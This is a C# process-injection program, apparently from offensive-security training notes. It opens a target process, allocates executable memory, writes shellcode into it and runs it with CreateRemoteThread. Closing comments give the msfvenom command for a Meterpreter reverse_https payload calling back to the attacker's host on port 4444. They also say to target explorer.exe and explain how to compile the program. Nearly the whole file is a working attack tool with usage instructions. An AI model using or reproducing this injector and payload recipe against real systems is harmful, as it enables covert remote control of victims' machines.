using System;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, < PID >);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[591] { < SHELLCODE > };
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

// IN SUMMARY; This code open a process and create a thread on it to migrate and existing shellcode on the target machine. In order to use this code, we need a x64 bits shellcode in CSharp format:

// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d ' ' -f2) LPORT=4444 -f csharp

// And the PID of Explorer.exe which can be retrieved through the 'Task Manager' or 'ps' command in a meterpreter session.

// Then, we compiled using a 'ConsoleApp (.NET framework)' (no ConsoleApp) project in VisualStudio, we call the project 'Inject' and change the Build format to 'Release' and 'x64' architecture. Then we press Ctrl + Shift + B to generate an executable.